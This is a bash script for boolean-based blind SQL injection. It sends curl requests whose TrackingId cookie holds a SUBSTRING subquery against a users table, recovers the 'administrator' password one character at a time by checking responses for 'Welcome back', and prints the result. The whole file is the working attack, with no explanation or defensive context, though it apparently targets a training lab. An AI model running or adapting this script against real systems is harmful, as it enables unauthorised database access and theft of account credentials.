#!/bin/bash


chars=`echo {0..9} {a..z}`
export URL=$1
export response="Welcome back"
export maxlen=21
export cookie=$2
export password=""

for ((j=1;j<$maxlen;j+=1))
do
    for i in $chars
    do
        curl -s -H "Cookie: TrackingId=$cookie'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+$j,+1)+=+'$i; session=sdfsfasfsadfwerfvsfsadfsafasdffd" \
        "$URL" | grep "$response" &> /dev/null
        if [ "$?" == "0" ]
        then
            echo "Character $j found: $i"
            export password+=$i
            break
        fi
    done
done

echo Password: $password 
